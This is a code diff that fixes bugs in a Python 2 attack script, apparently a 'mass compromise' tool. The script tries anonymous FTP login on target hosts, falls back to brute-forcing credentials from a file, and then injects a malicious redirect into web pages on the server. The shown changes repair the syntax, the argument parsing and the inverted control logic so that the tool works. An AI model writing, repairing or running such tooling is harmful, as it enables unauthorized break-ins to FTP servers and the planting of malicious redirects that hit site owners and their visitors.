@@ -10,7 +10,7 @@ def anon_login(hostname):
               ' FTP Anonymous Login Successful')
         ftp.quit()
         return True
-    except Exception e:
+    except Exception as e:
         print '\n[-] ' + str(hostname) +\
             ' FTP Anonymous Login Failed'
         return False
@@ -18,7 +18,7 @@ def anon_login(hostname):
 
 def bruteful_login(hostname, pwd_file):
     with open(pwd_file) as pwds:
-        for line in pwds.readlines()
+        for line in pwds:
             time.sleep(1)
             split_line = line.split(':')
             uname = split_line[0]
@@ -73,7 +73,7 @@ def attack(uname, pwd, target, redirect):
         inject_page(ftp, page, redirect)
 
 def main():
-    import os
+    import os.path
 
     parser = argparse.ArgumentParser(
         description=u'Mass Comprimise - Injects a malicious redirect into vulnerable files on an FTP server'
@@ -82,27 +82,28 @@ def main():
     parser.add_argument(
         u'-H',
         dest='target_hosts',
-        type='string',
-        help='IP-address of target which you want to exploit'
+        default=None,
+        help=u'IP-address of target which you want to exploit'
     )
 
     parser.add_argument(
         u'-r',
         dest='redirect',
-        type='string',
-        help='The string you want to inject into any vulnerable files.'
+        default=None,
+        help=u'The string you want to inject into any vulnerable files.'
     )
 
     parser.add_argument(
         u'-f',
         dest='credentials_file',
-        type='string',
-        help='The PATH to a file containing user credentials'
+        default=None,
+        help=u'The PATH to a file containing user credentials'
     )
     arguments = parser.parse_args()
 
     tgt_hosts = str(arguments.target_hosts).split(', ')
-    credentials = arguments.credentials_file
+    #credentials = arguments.credentials_file
+    is_file = os.path.isfile(arguments.credentials_file)
     redirect = arguments.redirect
 
     if tgt_hosts == None:
@@ -110,17 +111,18 @@ def main():
         print '[!] Sorry, you need to enter a target!'
         raise SystemExit
 
-    if os.path.isfile(credentials):
+    if not is_file:
         parser.print_help()
         print '[!] File not found!'
         raise SystemExit
 
+    credentials = arguments.credentials_file
 
     for host in tgt_hosts:
         user = None
         password = None
 
-        if anon_login(user, password):
+        if anon_login(host):
             username = 'anonymous'
             password = 'me@your.com'
             print '[+] Using Anonymous Creds to attack'
